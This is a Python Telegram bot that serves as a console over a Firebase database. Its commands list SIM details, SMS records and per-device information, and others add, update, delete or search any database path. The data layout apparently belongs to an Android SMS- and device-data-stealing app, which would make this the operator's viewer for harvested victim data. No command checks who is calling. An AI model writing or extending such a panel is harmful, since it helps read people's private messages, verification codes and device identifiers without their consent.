import os
import json
import telebot
from dotenv import load_dotenv
from firebase import read_data, write_data, update_data, delete_data

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")

if not TOKEN:
    raise RuntimeError("BOT_TOKEN is missing in Render Environment Variables")

bot = telebot.TeleBot(TOKEN)


# =========================
# START
# =========================

@bot.message_handler(commands=["start"])
def start(message):
    text = (
        "🤖 Firebase Bot V2\n\n"
        "📱 Main Commands:\n"
        "/sim - SIM Details\n"
        "/info - Device Info\n"
        "/sms - SMS Data\n"
        "/device DEVICE_ID - Device Info\n"
        "/users - List users\n"
        "/stats - Database statistics\n\n"
        "📝 Data Management:\n"
        "/add - Add data\n"
        "/update - Update data\n"
        "/delete - Delete data\n\n"
        "🔍 Search:\n"
        "/search KEYWORD - Search database"
    )

    bot.reply_to(message, text)


# =========================
# SIM
# =========================

@bot.message_handler(commands=["sim"])
def sim(message):
    data = read_data("All_Users/simDetails")

    if not data:
        bot.reply_to(message, "❌ No SIM data found")
        return

    response = "📱 SIM Details:\n\n"

    if isinstance(data, dict):
        for key, value in data.items():
            response += f"• {key}: {value}\n"
    else:
        response += str(data)

    bot.reply_to(message, response[:4000])


# =========================
# DEVICE INFO
# =========================

@bot.message_handler(commands=["info"])
def info(message):
    data = read_data("All_Users/Data/DeviceInfo")

    if not data:
        bot.reply_to(message, "❌ No device info found")
        return

    response = "📱 Device Info:\n\n"

    if isinstance(data, dict):
        for device_id, device_info in data.items():
            response += f"Device ID: {device_id}\n"

            if isinstance(device_info, dict):
                for key, value in device_info.items():
                    response += f"  • {key}: {value}\n"
            else:
                response += f"  • {device_info}\n"

            response += "\n"
    else:
        response += str(data)

    bot.reply_to(message, response[:4000])


# =========================
# SMS
# =========================

@bot.message_handler(commands=["sms"])
def sms(message):
    data = read_data("All_Users/sms")

    if not data:
        bot.reply_to(message, "❌ No SMS data found")
        return

    response = "📨 SMS Data:\n\n"

    if isinstance(data, dict):
        for key, value in data.items():
            response += f"{key}: {value}\n"
    else:
        response += str(data)

    bot.reply_to(message, response[:4000])


# =========================
# SINGLE DEVICE
# =========================

@bot.message_handler(commands=["device"])
def device(message):
    args = message.text.split(maxsplit=1)

    if len(args) != 2:
        bot.reply_to(
            message,
            "❌ Usage:\n/device DEVICE_ID"
        )
        return

    device_id = args[1].strip()

    data = read_data(
        f"All_Users/Data/DeviceInfo/{device_id}"
    )

    if not data:
        bot.reply_to(
            message,
            f"❌ Device '{device_id}' not found"
        )
        return

    response = f"📱 Device: {device_id}\n\n"

    if isinstance(data, dict):
        for key, value in data.items():
            response += f"• {key}: {value}\n"
    else:
        response += str(data)

    bot.reply_to(message, response[:4000])


# =========================
# USERS
# =========================

@bot.message_handler(commands=["users"])
def users(message):
    data = read_data("All_Users")

    if not data or not isinstance(data, dict):
        bot.reply_to(message, "❌ No users found")
        return

    excluded = {"Data", "simDetails", "sms"}

    user_list = [
        key for key in data.keys()
        if key not in excluded
    ]

    if not user_list:
        bot.reply_to(message, "❌ No user data found")
        return

    response = "👥 Users:\n\n"

    for number, user in enumerate(user_list, 1):
        response += f"{number}. {user}\n"

    bot.reply_to(message, response[:4000])


# =========================
# STATS
# =========================

@bot.message_handler(commands=["stats"])
def stats(message):
    data = read_data("All_Users")

    if not data or not isinstance(data, dict):
        bot.reply_to(message, "❌ No database data found")
        return

    excluded = {"Data", "simDetails", "sms"}

    total_users = len([
        key for key in data.keys()
        if key not in excluded
    ])

    device_data = read_data(
        "All_Users/Data/DeviceInfo"
    )

    sms_data = read_data(
        "All_Users/sms"
    )

    total_devices = (
        len(device_data)
        if isinstance(device_data, dict)
        else 0
    )

    total_sms = (
        len(sms_data)
        if isinstance(sms_data, dict)
        else 0
    )

    response = (
        "📊 Database Statistics\n\n"
        f"👥 Users: {total_users}\n"
        f"📱 Devices: {total_devices}\n"
        f"📨 SMS Records: {total_sms}"
    )

    bot.reply_to(message, response)


# =========================
# ADD
# =========================

@bot.message_handler(commands=["add"])
def add(message):
    args = message.text.split(maxsplit=2)

    if len(args) != 3:
        bot.reply_to(
            message,
            "❌ Usage:\n/add PATH VALUE"
        )
        return

    path = args[1]
    value = args[2]

    try:
        if value.startswith("{") or value.startswith("["):
            value = json.loads(value)
    except json.JSONDecodeError:
        pass

    if write_data(path, value):
        bot.reply_to(
            message,
            f"✅ Data added\nPath: {path}"
        )
    else:
        bot.reply_to(message, "❌ Failed to add data")


# =========================
# UPDATE
# =========================

@bot.message_handler(commands=["update"])
def update(message):
    args = message.text.split(maxsplit=2)

    if len(args) != 3:
        bot.reply_to(
            message,
            "❌ Usage:\n/update PATH VALUE"
        )
        return

    path = args[1]
    value = args[2]

    try:
        if value.startswith("{") or value.startswith("["):
            value = json.loads(value)
    except json.JSONDecodeError:
        pass

    if update_data(path, value):
        bot.reply_to(
            message,
            f"✅ Data updated\nPath: {path}"
        )
    else:
        bot.reply_to(message, "❌ Failed to update data")


# =========================
# DELETE
# =========================

@bot.message_handler(commands=["delete"])
def delete(message):
    args = message.text.split(maxsplit=1)

    if len(args) != 2:
        bot.reply_to(
            message,
            "❌ Usage:\n/delete PATH"
        )
        return

    path = args[1]

    if delete_data(path):
        bot.reply_to(
            message,
            f"✅ Data deleted\nPath: {path}"
        )
    else:
        bot.reply_to(message, "❌ Failed to delete data")


# =========================
# SEARCH
# =========================

@bot.message_handler(commands=["search"])
def search(message):
    args = message.text.split(maxsplit=1)

    if len(args) != 2:
        bot.reply_to(
            message,
            "❌ Usage:\n/search KEYWORD"
        )
        return

    keyword = args[1].lower()
    data = read_data("All_Users")

    if not data:
        bot.reply_to(message, "❌ No data found")
        return

    results = []

    def search_recursive(obj, path=""):
        if isinstance(obj, dict):
            for key, value in obj.items():

                new_path = (
                    f"{path}/{key}"
                    if path
                    else key
                )

                if keyword in str(key).lower():
                    results.append(
                        f"📌 {new_path}"
                    )

                search_recursive(
                    value,
                    new_path
                )

        elif isinstance(obj, list):
            for index, value in enumerate(obj):
                new_path = f"{path}[{index}]"
                search_recursive(
                    value,
                    new_path
                )

        else:
            value_string = str(obj).lower()

            if keyword in value_string:
                results.append(
                    f"📌 {path} = {str(obj)[:100]}"
                )

    search_recursive(data)

    if not results:
        bot.reply_to(
            message,
            f"❌ No results for: {keyword}"
        )
        return

    response = (
        f"🔍 Search Results: {keyword}\n\n"
    )

    response += "\n".join(results[:20])

    if len(results) > 20:
        response += (
            f"\n\n... {len(results) - 20} more"
        )

    bot.reply_to(message, response[:4000])


# =========================
# UNKNOWN COMMAND
# =========================

@bot.message_handler(func=lambda message: True)
def handle_unknown(message):
    bot.reply_to(
        message,
        "❌ Unknown command\n\n"
        "Send /start"
    )


# =========================
# RUN BOT
# =========================

print("🤖 Firebase Bot V2 Started")

while True:
    try:
        bot.infinity_polling(
            timeout=30,
            long_polling_timeout=30
        )

    except Exception as error:
        print(f"⚠️ Bot error: {error}")
        print("🔄 Restarting bot...")
